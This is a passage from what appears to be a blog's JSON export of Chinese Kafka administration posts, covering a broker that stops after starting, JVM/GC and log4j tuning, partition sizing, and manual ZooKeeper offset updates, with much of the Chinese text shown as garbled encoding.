[Socket Server on Broker 2], Shutdown completed (kafka.network.SocketServer)[2018-04-01 11:24:08,294] INFO [Kafka Request Handler on Broker 2], shutting down (kafka.server.KafkaRequestHandlerPool)[2018-04-01 11:24:08,353] INFO [Kafka Request Handler on Broker 2], shut down completely (kafka.server.KafkaRequestHandlerPool)[2018-04-01 11:24:08,368] INFO [ThrottledRequestReaper-Produce], Shutting down (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:08,856] INFO [ThrottledRequestReaper-Produce], Stopped (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:08,857] INFO [ThrottledRequestReaper-Produce], Shutdown completed (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:08,857] INFO [ThrottledRequestReaper-Fetch], Shutting down (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:09,847] INFO [ThrottledRequestReaper-Fetch], Stopped (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:09,847] INFO [ThrottledRequestReaper-Fetch], Shutdown completed (kafka.server.ClientQuotaManager$ThrottledRequestReaper)[2018-04-01 11:24:09,848] INFO [KafkaApi-2] Shutdown complete. (kafka.server.KafkaApis)[2018-04-01 11:24:09,852] INFO [Replica Manager on Broker 2]: Shutting down (kafka.server.ReplicaManager)[2018-04-01 11:24:09,855] INFO [ReplicaFetcherManager on broker 2] shutting down (kafka.server.ReplicaFetcherManager)[2018-04-01 11:24:09,856] INFO [ReplicaFetcherThread-0-4], Shutting down (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,877] INFO [ReplicaFetcherThread-0-4], Stopped (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,877] INFO [ReplicaFetcherThread-0-4], Shutdown completed (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,879] INFO [ReplicaFetcherThread-0-1], Shutting down (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,901] INFO [ReplicaFetcherThread-0-1], Stopped (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,901] INFO [ReplicaFetcherThread-0-1], Shutdown completed (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:09,903] INFO [ReplicaFetcherThread-0-3], Shutting down (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:10,194] INFO [ReplicaFetcherThread-0-3], Stopped (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:10,194] INFO [ReplicaFetcherThread-0-3], Shutdown completed (kafka.server.ReplicaFetcherThread)[2018-04-01 11:24:10,196] INFO [ReplicaFetcherManager on broker 2] shutdown completed (kafka.server.ReplicaFetcherManager)[2018-04-01 11:24:10,196] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,375] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,375] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,375] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,515] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,516] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:10,523] INFO [Replica Manager on Broker 2]: Shut down completely (kafka.server.ReplicaManager)[2018-04-01 11:24:10,529] INFO Shutting down. (kafka.log.LogManager)[2018-04-01 11:24:27,288] INFO Shutdown complete. (kafka.log.LogManager)[2018-04-01 11:24:27,289] INFO [GroupCoordinator 2]: Shutting down. (kafka.coordinator.GroupCoordinator)[2018-04-01 11:24:27,290] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,409] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,409] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,410] INFO [ExpirationReaper-2], Shutting down (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,563] INFO [ExpirationReaper-2], Stopped (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,563] INFO [ExpirationReaper-2], Shutdown completed (kafka.server.DelayedOperationPurgatory$ExpiredOperationReaper)[2018-04-01 11:24:27,565] INFO [GroupCoordinator 2]: Shutdown complete. (kafka.coordinator.GroupCoordinator)[2018-04-01 11:24:27,640] INFO [Kafka Server 2], shut down completed (kafka.server.KafkaServer) ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ centos çš„ OOM Killer å…³äº†å®ƒï¼Œä½†æ˜¯å½“æˆ‘æ”¹äº† oom_score ä¹‹åä¾æ—§ä¸è¡Œã€‚è€Œä¸”åœ¨/val/log/message é‡Œé¢æ²¡æœ‰æ‰¾çš„ç›¸å…³æ“ä½œçš„ logã€‚æˆ‘ç°åœ¨åº”è¯¥åšäº›ä»€ä¹ˆèƒ½ä¿®å¤ä»–ï¼Œæˆ–è€…è¿›ä¸€æ­¥çš„ç¡®å®šé”™è¯¯åŸå› ï¼Ÿ ç»è¿‡æŸ¥çœ‹ kafka çš„å¯åŠ¨è„šæœ¬ï¼Œä¸Šå‘¨å°è¯•ä½¿ç”¨ 1bin/kafka-server-start.sh -daemon ./config/server.properties è¿›è¡Œå¯åŠ¨ï¼Œåˆ°ç°åœ¨ä¸ºæ­¢ kafka è¿˜åœ¨æ­£å¸¸è¿è¡Œã€‚å’Œä¸åŠ  -daemon åŒºåˆ«åœ¨äºï¼š 12345678910bin/kafka-run-class.sh# Launch modeif [ \"x$DAEMON_MODE\" = \"xtrue\" ]; then #åŠ  daemon ä¼šä½¿ç”¨è¯¥å‘½ä»¤ nohup $JAVA $KAFKA_HEAP_OPTS $KAFKA_JVM_PERFORMANCE_OPTS $KAFKA_GC_LOG_OPTS $KAFKA_JMX_OPTS $KAFKA_LOG4J_OPTS -cp $CLASSPATH $KAFKA_OPTS \"$@\" &gt; \"$CONSOLE_OUTPUT_FILE\" 2&gt;&amp;1 &lt; /dev/null &amp;else #ä¸åŠ æ—¶ä½¿ç”¨çš„å‘½ä»¤ exec $JAVA $KAFKA_HEAP_OPTS $KAFKA_JVM_PERFORMANCE_OPTS $KAFKA_GC_LOG_OPTS $KAFKA_JMX_OPTS $KAFKA_LOG4J_OPTS -cp $CLASSPATH $KAFKA_OPTS \"$@\"fi æœºå™¨é…ç½®ï¼Ÿé›†ç¾¤æƒ…å†µï¼Ÿå•¥éƒ½æ²¡æœ‰â€¦åªæœ‰æ—¥å¿—â€¦zookeeperå’Œbrokeréƒ½éœ€è¦ä¸€å®šèµ„æº,è¿™ä¿©æ”¾åœ¨ä¸€èµ·ä¹Ÿä¼šé™ä½ç¨³å®šæ€§â€¦ 1su - jollybi -c \"/data/tools/kafka_2.10-0.9.0.1/bin/kafka-server-start.sh -daemon /data/tools/kafka_2.10-0.9.0.1/config/server.properties 2&gt;&amp;1 &gt; /dev/null\"","link":"/2017/02/11/Bigdata-hadoop/Kafka/kafka10.0.9ç‰ˆæœ¬æ€»æ˜¯åœ¨å¯åŠ¨ä¸€æ®µæ—¶é—´åè‡ªåŠ¨åœæ­¢/"},{"title":"Kafkaæ€§èƒ½ä¼˜åŒ–â€“JVMå‚æ•°é…ç½®ä¼˜åŒ–","text":"img-w650 Kafkaé›†ç¾¤ç¨³å®šGCè°ƒä¼˜ è°ƒGCæ˜¯é—¨æ‰‹è‰ºæ´»ï¼Œå¹¸äºJava 7å¼•è¿›äº†G1 åƒåœ¾å›æ”¶ï¼Œä½¿å¾—GCè°ƒä¼˜å˜çš„æ²¡é‚£ä¹ˆéš¾ã€‚G1ä¸»è¦æœ‰ä¸¤ä¸ªé…ç½®é€‰é¡¹æ¥è°ƒä¼˜ï¼šMaxGCPauseMillis å’Œ InitiatingHeapOccupancyPercentï¼Œå…·ä½“å‚æ•°è®¾ç½®å¯ä»¥å‚è€ƒGoogleï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚ Kafka brokerèƒ½å¤Ÿæœ‰æ•ˆçš„åˆ©ç”¨å †å†…å­˜å’Œå¯¹è±¡å›æ”¶ï¼Œæ‰€ä»¥è¿™äº›å€¼å¯ä»¥è°ƒå°ç‚¹ã€‚å¯¹äº 64Gbå†…å­˜ï¼ŒKafkaè¿è¡Œå †å†…å­˜5Gbï¼ŒMaxGCPauseMillis å’Œ InitiatingHeapOccupancyPercent åˆ†åˆ«è®¾ç½®ä¸º 20æ¯«ç§’å’Œ 35ã€‚Kafkaçš„å¯åŠ¨è„šæœ¬ä½¿ç”¨çš„ä¸æ˜¯ G1å›æ”¶ï¼Œéœ€è¦åœ¨ç¯å¢ƒå˜é‡ä¸­åŠ å…¥ã€‚ Kafka Brokerä¸ªæ•°å†³å®šå› ç´  ç£ç›˜å®¹é‡ï¼šé¦–å…ˆè€ƒè™‘çš„æ˜¯æ‰€éœ€ä¿å­˜çš„æ¶ˆæ¯æ‰€å ç”¨çš„æ€»ç£ç›˜å®¹é‡å’Œæ¯ä¸ªbrokeræ‰€èƒ½æä¾›çš„ç£ç›˜ç©ºé—´ã€‚å¦‚æœKafkaé›†ç¾¤éœ€è¦ä¿ç•™ 10 TBæ•°æ®ï¼Œå•ä¸ªbrokerèƒ½å­˜å‚¨ 2 TBï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦çš„æœ€å°Kafkaé›†ç¾¤å¤§å°5ä¸ªbrokerã€‚æ­¤å¤–ï¼Œå¦‚æœå¯ç”¨å‰¯æœ¬å‚æ•°ï¼Œåˆ™å¯¹åº”çš„å­˜å‚¨ç©ºé—´éœ€è‡³å°‘å¢åŠ ä¸€å€ï¼ˆå–å†³äºå‰¯æœ¬å‚æ•°ï¼‰ã€‚è¿™æ„å‘³ç€å¯¹åº”çš„Kafkaé›†ç¾¤è‡³å°‘éœ€è¦ 10 ä¸ªbrokerã€‚ è¯·æ±‚é‡ï¼šå¦å¤–ä¸€ä¸ªè¦è€ƒè™‘çš„æ˜¯Kafkaé›†ç¾¤å¤„ç†è¯·æ±‚çš„èƒ½åŠ›ã€‚è¿™ä¸»è¦å–å†³äºå¯¹Kafka clientè¯·æ±‚çš„ç½‘ç»œå¤„ç†èƒ½åŠ›ï¼Œç‰¹åˆ«æ˜¯ï¼Œæœ‰å¤šä¸ªconsumeræˆ–è€…ç½‘è·¯æµé‡ä¸ç¨³å®šã€‚å¦‚æœï¼Œé«˜å³°æ—¶åˆ»ï¼Œå•ä¸ªbrokerçš„ç½‘ç»œæµé‡è¾¾åˆ°80%ï¼Œè¿™æ—¶æ˜¯æ’‘ä¸ä½ä¸¤ä¸ªconsumerçš„ï¼Œé™¤éæœ‰ä¸¤ä¸ªbrokerã€‚å†è€…ï¼Œå¦‚æœå¯ç”¨äº†å‰¯æœ¬å‚æ•°ï¼Œåˆ™éœ€è¦è€ƒè™‘å‰¯æœ¬è¿™ä¸ªé¢å¤–çš„consumerã€‚ä¹Ÿå¯ä»¥æ‰©å±•å¤šä¸ªbrokeræ¥å‡å°‘ç£ç›˜çš„ååé‡å’Œç³»ç»Ÿå†…å­˜ã€‚ ä¸»è¦æ˜¯å¯åŠ¨è„šæœ¬å’Œlog4jåŸºæœ¬å‚æ•°çš„è®¾ç½®å’Œä¼˜åŒ–ï¼Œè¿™äº›å‚æ•°è—çš„æ¯”è¾ƒæ·±ã€‚1ã€JVMå‚æ•°é…ç½®ä¼˜åŒ–å¦‚æœä½¿ç”¨çš„CMS GCç®—æ³•ï¼Œå»ºè®®JVM Heapä¸è¦å¤ªå¤§ï¼Œåœ¨4GBä»¥å†…å°±å¯ä»¥ã€‚JVMå¤ªå¤§ï¼Œå¯¼è‡´Major GCæˆ–è€…Full GCäº§ç”Ÿçš„â€œstop the worldâ€æ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´brokerå’Œzkä¹‹é—´çš„sessionè¶…æ—¶ï¼Œæ¯”å¦‚é‡æ–°é€‰ä¸¾controllerèŠ‚ç‚¹å’Œæå‡follow replicaä¸ºleader replicaã€‚JVMä¹Ÿä¸èƒ½è¿‡å°ï¼Œå¦åˆ™ä¼šå¯¼è‡´é¢‘ç¹åœ°è§¦å‘gcæ“ä½œï¼Œä¹Ÿå½±å“Kafkaçš„ååé‡ã€‚å¦å¤–ï¼Œéœ€è¦é¿å…CMS GCè¿‡ç¨‹ä¸­çš„å‘ç”Ÿpromotion failureå’Œconcurrent failureé—®é¢˜ã€‚CMSInitiatingOccupancyFraction=70å¯ä»¥é¢„é˜²concurrent failureé—®é¢˜ï¼Œæå‰å‡ºå‘Major GCã€‚Kafka JVMå‚æ•°å¯ä»¥ç›´æ¥ä¿®æ”¹å¯åŠ¨è„šæœ¬bin/kafka-server-start.shä¸­çš„å˜é‡å€¼ã€‚ä¸‹é¢æ˜¯ä¸€äº›åŸºæœ¬å‚æ•°ï¼Œä¹Ÿå¯ä»¥æ ¹æ®å®é™…çš„gcçŠ¶å†µå’Œè°ƒè¯•GCéœ€è¦å¢åŠ ä¸€äº›ç›¸å…³çš„å‚æ•°ã€‚ 1export KAFKA_HEAP_OPTS=\"-Xmx8G -Xms8G -Xmn4G -XX:PermSize=64m -XX:MaxPermSize=128m -XX:SurvivorRatio=6 -XX:CMSInitiatingOccupancyFraction=70 -XX:+UseCMSInitiatingOccupancyOnly\" éœ€è¦å…³æ³¨gcæ—¥å¿—ä¸­çš„YGCæ—¶é—´ä»¥åŠCMS GCé‡Œé¢çš„CMS-initial-markå’ŒCMS-remarkä¸¤ä¸ªé˜¶æ®µçš„æ—¶é—´ï¼Œè¿™äº›GCè¿‡ç¨‹æ˜¯â€œstop the worldâ€æ–¹å¼å®Œæˆçš„ã€‚ jdk1.8 ä¼˜åŒ–çš„è¯ä¼šæç¤ºMaxPermSize=128m,PermSize=64m å­—é¢æ„æ€æ˜¯MaxPermSizeä¸éœ€è¦æˆ‘ä»¬é…ç½®äº†,jdk1.8 ç‰ˆæœ¬åŠŸèƒ½å…¶å®å·²ä¸éœ€è¦è¿™ä¸ªä¼˜åŒ–å‚æ•°ï¼š 12345678[jollybi@kafka3 kafka_2.10-0.8.2.1]$ /data/tools/kafka_2.10-0.8.2.1/bin/kafka-server-start.sh /data/tools/kafka_2.10-0.8.2.1/config/server.properties &amp;[1] 10312[jollybi@kafka3 kafka_2.10-0.8.2.1]$ Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=64m; support was removed in 8.0Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0ä¼˜åŒ–å‚æ•°ï¼šexport KAFKA_HEAP_OPTS=\"-Xmx4G -Xms4G -Xmn2G -XX:SurvivorRatio=6 -XX:CMSInitiatingOccupancyFraction=70 -XX:+UseCMSInitiatingOccupancyOnly\"export JMX_PORT=\"9999\" ### Kafka Managerç›‘æ§ç›‘å¬jmxç«¯å£,å¦‚æœæ²¡æœ‰å¯ä¸è®¾ç½®ã€‚ 2ã€æ‰“å¼€JMXç«¯å£12ä¸»è¦æ˜¯ä¸ºäº†é€šè¿‡JMXç«¯å£ç›‘æ§Kafka Brokerä¿¡æ¯ã€‚å¯ä»¥åœ¨bin/kafka-server-start.shä¸­æ‰“å¼€JMXç«¯å£å˜é‡ã€‚export JMX_PORT=9999 3ã€è°ƒæ•´log4jçš„æ—¥å¿—çº§åˆ«å¦‚æœé›†ç¾¤ä¸­topicå’Œpartitionæ•°é‡è¾ƒå¤§æ—¶ï¼Œå› ä¸ºlog4jçš„æ—¥å¿—çº§åˆ«å¤ªä½ï¼Œå¯¼è‡´è¿›ç¨‹æŒç»­å¾ˆé•¿çš„æ—¶é—´åœ¨æ‰“å°æ—¥å¿—ã€‚æ—¥å¿—é‡å·¨å¤§ï¼Œå¯¼è‡´å¾ˆå¤šé¢å¤–çš„æ€§èƒ½å¼€é”€ã€‚ç‰¹åˆ«æ˜¯contolleræ—¥å¿—çº§åˆ«ä¸ºtraceçº§åˆ«ï¼Œè¿™ç‚¹æ¯”è¾ƒå‘ã€‚Tips é€šè¿‡JMXç«¯å£è®¾ç½®log4jæ—¥å¿—çº§åˆ«ï¼Œä¸ç”¨é‡å¯brokerèŠ‚ç‚¹ 1234567è®¾ç½®æ—¥å¿—çº§åˆ«ï¼šjava -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController setLogLevel=kafka.controller,INFOjava -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController setLogLevel=state.change.logger,INFO æ£€æŸ¥æ—¥å¿—çº§åˆ«ï¼šjava -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController getLogLevel=kafka.controllerjava -jar cmdline-jmxclient-0.10.3.jar - localhost:9999 kafka:type=kafka.Log4jController getLogLevel=state.change.logger 4ã€æ€§èƒ½ä¼˜åŒ–æŠ€å·§4.1ã€é…ç½®åˆé€‚çš„partitonsæ•°é‡ã€‚ è¿™ä¼¼ä¹æ˜¯kafkaæ–°æ‰‹å¿…é—®å¾—é—®é¢˜ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¿…é¡»ç†è§£ï¼Œpartitonæ˜¯kafkaçš„å¹¶è¡Œå•å…ƒã€‚ä»producerå’Œbrokerçš„è§†è§’çœ‹ï¼Œå‘ä¸åŒçš„partitionå†™å…¥æ˜¯å®Œå…¨å¹¶è¡Œçš„ï¼›è€Œå¯¹äºconsumerï¼Œå¹¶å‘æ•°å®Œå…¨å–å†³äºpartitionçš„æ•°é‡ï¼Œå³ï¼Œå¦‚æœconsumeræ•°é‡å¤§äºpartitionæ•°é‡ï¼Œåˆ™å¿…æœ‰consumeré—²ç½®ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºkafkaçš„ååä¸partitionæ—¶çº¿æ€§å…³ç³»ã€‚partitionçš„æ•°é‡è¦æ ¹æ®ååæ¥æ¨æ–­ï¼Œå‡å®špä»£è¡¨ç”Ÿäº§è€…å†™å…¥å•ä¸ªpartitionçš„æœ€å¤§ååï¼Œcä»£è¡¨æ¶ˆè´¹è€…ä»å•ä¸ªpartitionæ¶ˆè´¹çš„æœ€å¤§ååï¼Œæˆ‘ä»¬çš„ç›®æ ‡ååæ˜¯tï¼Œé‚£ä¹ˆpartitionçš„æ•°é‡åº”è¯¥æ˜¯t/på’Œt/cä¸­è¾ƒå¤§çš„é‚£ä¸€ä¸ªã€‚å®é™…æƒ…å†µä¸­ï¼Œpçš„å½±å“å› ç´ æœ‰æ‰¹å¤„ç†çš„è§„æ¨¡ï¼Œå‹ç¼©ç®—æ³•ï¼Œç¡®è®¤æœºåˆ¶å’Œå‰¯æœ¬æ•°ç­‰ï¼Œç„¶è€Œï¼Œå¤šæ¬¡benchmarkçš„ç»“æœè¡¨æ˜ï¼Œå•ä¸ªpartitionçš„æœ€å¤§å†™å…¥åååœ¨10MB/secå·¦å³ï¼›cçš„å½±å“å› ç´ æ˜¯é€»è¾‘ç®—æ³•ï¼Œéœ€è¦åœ¨ä¸åŒåœºæ™¯ä¸‹å®æµ‹å¾—å‡ºã€‚ è¿™ä¸ªç»“è®ºä¼¼ä¹å¤ªä¹¦ç”Ÿæ°”å’Œä¸å®ç”¨ã€‚æˆ‘ä»¬é€šå¸¸å»ºè®®partitionçš„æ•°é‡ä¸€å®šè¦å¤§äºç­‰äºæ¶ˆè´¹è€…çš„æ•°é‡æ¥å®ç°æœ€å¤§å¹¶å‘ã€‚å®˜æ–¹æ›¾æµ‹è¯•è¿‡1ä¸‡ä¸ªpartitionçš„æƒ…å†µï¼Œæ‰€ä»¥ä¸éœ€è¦å¤ªæ‹…å¿ƒpartitionè¿‡å¤šçš„é—®é¢˜ã€‚ä¸‹é¢çš„çŸ¥è¯†ä¼šæœ‰åŠ©äºè¯»è€…åœ¨ç”Ÿäº§ç¯å¢ƒåšå‡ºæœ€ä½³çš„é€‰æ‹©ï¼š 12345678910aã€ä¸€ä¸ªpartitionå°±æ˜¯ä¸€ä¸ªå­˜å‚¨kafka-logçš„ç›®å½•ã€‚bã€ä¸€ä¸ªpartitionåªèƒ½å¯„å®¿åœ¨ä¸€ä¸ªbrokerä¸Šã€‚cã€å•ä¸ªpartitionæ˜¯å¯ä»¥å®ç°æ¶ˆæ¯çš„é¡ºåºå†™å…¥çš„ã€‚dã€å•ä¸ªpartitionåªèƒ½è¢«å•ä¸ªæ¶ˆè´¹è€…è¿›ç¨‹æ¶ˆè´¹ï¼Œä¸è¯¥æ¶ˆè´¹è€…æ‰€å±äºçš„æ¶ˆè´¹ç»„æ— å…³ã€‚è¿™æ ·åšï¼Œæœ‰åŠ©äºå®ç°é¡ºåºæ¶ˆè´¹ã€‚eã€å•ä¸ªæ¶ˆè´¹è€…è¿›ç¨‹å¯åŒæ—¶æ¶ˆè´¹å¤šä¸ªpartitionï¼Œå³partitioné™åˆ¶äº†æ¶ˆè´¹ç«¯çš„å¹¶å‘èƒ½åŠ›ã€‚fã€partitionè¶Šå¤šåˆ™fileå’Œmemoryæ¶ˆè€—è¶Šå¤§ï¼Œè¦åœ¨æœåŠ¡å™¨æ‰¿å—æœåŠ¡å™¨è®¾ç½®ã€‚gã€æ¯ä¸ªpartitionä¿¡æ¯éƒ½å­˜åœ¨æ‰€æœ‰çš„zkèŠ‚ç‚¹ä¸­ã€‚hã€partitionè¶Šå¤šåˆ™å¤±è´¥é€‰ä¸¾è€—æ—¶è¶Šé•¿ã€‚kã€offsetæ˜¯å¯¹æ¯ä¸ªpartitionè€Œè¨€çš„ï¼Œpartitionè¶Šå¤šï¼ŒæŸ¥è¯¢offsetå°±è¶Šè€—æ—¶ã€‚iã€partitionçš„æ•°é‡æ˜¯å¯ä»¥åŠ¨æ€å¢åŠ çš„ï¼ˆåªèƒ½åŠ ä¸èƒ½å‡ï¼‰ã€‚ æˆ‘ä»¬å»ºè®®çš„åšæ³•æ˜¯ï¼Œå¦‚æœæ˜¯3ä¸ªbrokerçš„é›†ç¾¤ï¼Œæœ‰5ä¸ªæ¶ˆè´¹è€…ï¼Œé‚£ä¹ˆå»ºè®®partitionçš„æ•°é‡æ˜¯15ï¼Œä¹Ÿå°±æ˜¯brokerå’Œconsumeræ•°é‡çš„æœ€å°å…¬å€æ•°ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¤§äºæ¶ˆè´¹è€…çš„brokeræ•°é‡çš„å€æ•°ï¼Œæ¯”å¦‚6æˆ–è€…9ï¼Œè¿˜è¯·è¯»è€…è‡ªè¡Œæ ¹æ®å®é™…ç¯å¢ƒè£å®šã€‚ Communicative learning:ğŸ§ Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)ğŸ§ BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/07/04/Bigdata-hadoop/Kafka/kafkaæ€§èƒ½ä¼˜åŒ–â€“JVMå‚æ•°é…ç½®ä¼˜åŒ–/"},{"title":"Bigdata-å¦‚ä½•æ‰‹åŠ¨æ›´æ–°Kafkaä¸­æŸä¸ªTopicçš„åç§»é‡","text":"å¦‚ä½•æ‰‹åŠ¨æ›´æ–°Kafkaä¸­æŸä¸ªTopicçš„åç§»é‡ æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒKafka topicçš„åç§»é‡ä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨åœ¨Zookeeperä¸­ï¼Œå…·ä½“çš„è·¯å¾„ä¸º/consumers/[groupId]/offsets/[topic]/[partitionId]ï¼Œæ¯”å¦‚iteblogä¸»é¢˜åˆ†åŒº10çš„åç§»é‡è·å–å¦‚ä¸‹ï¼šåœ¨æœ‰äº›åœºæ™¯ä¸‹ï¼Œè¿™ä¸ªå·¥å…·ä¸æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯èƒ½å¤Ÿæ‰‹åŠ¨è®¾ç½®åˆ†åŒºçš„åç§»é‡ä¸ºä»»ä½•æœ‰æ„ä¹‰çš„å€¼ï¼Œè€Œä¸ä»…ä»…æ˜¯earliestæˆ–è€…latestã€‚é‚£å’‹åŠï¼Ÿ æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒKafka topicçš„åç§»é‡ä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨åœ¨Zookeeperä¸­ï¼Œå…·ä½“çš„è·¯å¾„ä¸º/consumers/[groupId]/offsets/[topic]/[partitionId]ï¼Œæ¯”å¦‚mongotail_lz4ä¸»é¢˜åˆ†åŒº10çš„åç§»é‡è·å–å¦‚ä¸‹ï¼š 12345678910111213[zk: 127.0.0.1:2281(CONNECTED) 2] get /consumers/ibm_event/offsets/mongotail_lz4/10293894cZxid = 0x6000011f3ctime = Wed Jul 26 17:57:27 CST 2017mZxid = 0x6000018c9mtime = Wed Jul 26 18:18:27 CST 2017pZxid = 0x6000011f3cversion = 0dataVersion = 20aclVersion = 0ephemeralOwner = 0x0dataLength = 6numChildren = 0 æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡setå‘½ä»¤æ¥è®¾ç½®æŸä¸ªåˆ†åŒºçš„åç§»é‡ï¼Œå¦‚ä¸‹ï¼› 12345678910111213[zk: 127.0.0.1:2281(CONNECT get /consumers/ibm_event/offsets/mongotail_lz4/10 0 0cZxid = 0x6000011f3ctime = Wed Jul 26 17:57:27 CST 2017mZxid = 0x60000204cmtime = Wed Jul 26 18:37:21 CST 2017pZxid = 0x6000011f3cversion = 0dataVersion = 21aclVersion = 0ephemeralOwner = 0x0dataLength = 1numChildren = 0 12ä¸ªåˆ†åŒºåˆ†åˆ«æ›´æ–°è¿‡å»ã€‚ äº¤æµå­¦ä¹ ï¼šğŸ§ Linux shell_é«˜çº§è¿ç»´æ´¾: 459096184 åœˆå­ (ç³»ç»Ÿè¿ç»´-åº”ç”¨è¿ç»´-è‡ªåŠ¨åŒ–è¿ç»´-è™šæ‹ŸåŒ–æŠ€æœ¯ç ”ç©¶æ¬¢è¿åŠ å…¥)ğŸ§ BigData-Exchange School : 521621407 åœˆå­ï¼ˆå¤§æ•°æ®è¿ç»´)ï¼ˆHadoopå¼€å‘äººå‘˜)ï¼ˆå¤§æ•°æ®ç ”ç©¶çˆ±å¥½è€…) æ¬¢è¿åŠ å…¥ ç›¸åº”Bidataæœ‰å†…éƒ¨å¾®ä¿¡äº¤æµç¾¤äº’ç›¸å­¦ä¹ ï¼ŒåŠ å…¥QQç¾¤æœ‰é“¾æ¥ã€‚","link":"/2017/06/29/Bigdata-hadoop/Kafka/å¦‚ä½•æ‰‹åŠ¨æ›´æ–°Kafkaä¸­æŸä¸ªTopicçš„åç§»é‡/"},{"title":"Bigdata-å¼€æºçš„Kafkaé›†ç¾¤ç®¡ç†å™¨(Kafka Manager)","text":"Kafka ManagerA tool for managing Apache Kafka. It supports the following: ç®¡ç†å¤šä¸ªç¾¤é›† å®¹æ˜“æ£€æŸ¥é›†ç¾¤çŠ¶æ€ï¼ˆä¸»é¢˜ï¼Œæ¶ˆè´¹è€…ï¼Œåç§»é‡ï¼Œç»çºªäººï¼Œå‰¯æœ¬åˆ†å‘ï¼Œåˆ†åŒºåˆ†é…ï¼‰ è¿è¡Œé¦–é€‰å‰¯æœ¬é€‰ä¸¾ ä½¿ç”¨é€‰é¡¹ç”Ÿæˆåˆ†åŒºåˆ†é…ï¼Œä»¥é€‰æ‹©è¦ä½¿ç”¨çš„ä»£ç† è¿è¡Œåˆ†åŒºçš„é‡æ–°åˆ†é…ï¼ˆåŸºäºç”Ÿæˆçš„åˆ†é…ï¼‰ åˆ›å»ºå¯é€‰ä¸»é¢˜é…ç½®çš„ä¸»é¢˜ï¼ˆ0.8.1.1å…·æœ‰ä¸åŒäº0.8.2+çš„é…ç½®ï¼‰ åˆ é™¤ä¸»é¢˜ï¼ˆä»…æ”¯æŒ0.8.2+ï¼Œå¹¶è®°ä½åœ¨ä»£ç†é… ç½®ä¸­è®¾ç½®delete.topic.enable = trueï¼‰ ä¸»é¢˜åˆ—è¡¨ç°åœ¨è¡¨ç¤ºæ ‡è®°ä¸ºåˆ é™¤çš„ä¸»é¢˜ï¼ˆä»…æ”¯æŒ0.8.2+ï¼‰ æ‰¹é‡ç”Ÿæˆå¤šä¸ªä¸»é¢˜çš„åˆ†åŒºåˆ†é…ï¼Œå¹¶é€‰æ‹©è¦ä½¿ç”¨çš„ä»£ç† æ‰¹é‡è¿è¡Œå¤šä¸ªä¸»é¢˜çš„åˆ†åŒºé‡æ–°åˆ†é… å°†åˆ†åŒºæ·»åŠ åˆ°ç°æœ‰ä¸»é¢˜ æ›´æ–°ç°æœ‰ä¸»é¢˜çš„é…ç½® å¯é€‰åœ°ï¼Œå¯ç”¨JMXè½®è¯¢ä»£ç†çº§å’Œä¸»é¢˜çº§åº¦é‡ã€‚ å¯é€‰åœ°ç­›é€‰å‡ºåœ¨zookeeperä¸­æ²¡æœ‰ids / owner /ï¼†offset /ç›®å½•çš„æ¶ˆè´¹è€…ã€‚ 